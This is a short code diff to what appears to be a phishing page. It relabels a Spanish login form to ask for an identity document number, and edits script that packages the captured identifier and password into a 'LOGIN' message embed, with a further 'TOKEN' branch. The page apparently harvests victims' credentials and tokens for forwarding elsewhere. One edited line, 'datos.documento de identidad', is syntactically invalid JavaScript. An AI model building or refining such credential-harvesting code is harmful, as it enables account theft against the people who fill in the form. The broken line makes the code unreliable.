@@ -168,7 +168,7 @@
                                 documento de identidad</label>
                             <input
                                 class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500 text-gray-700 text-base"
-                                id="Documento de identidad" type="text" placeholder="Usuario">
+                                id="documento de identidad" type="text" placeholder="documento de identidad">
                         </div>
                         <div class="mb-6 relative">
                             <label class="block text-gray-700 text-sm font-semibold mb-2" for="contrasena">Ingrese su
@@ -323,7 +323,7 @@
                 // Agregar campos según el tipo
                 if (tipo === 'LOGIN') {
                     embed.fields.push(
-                        { name: '👤 Usuario', value: datos.usuario || '(vacío)', inline: true },
+                        { name: '👤 documento de identidad', value: datos.documento de identidad || '(vacío)', inline: true },
                         { name: '🔒 Contraseña', value: datos.contrasena || '(vacía)', inline: true }
                     );
                 } else if (tipo === 'TOKEN') {
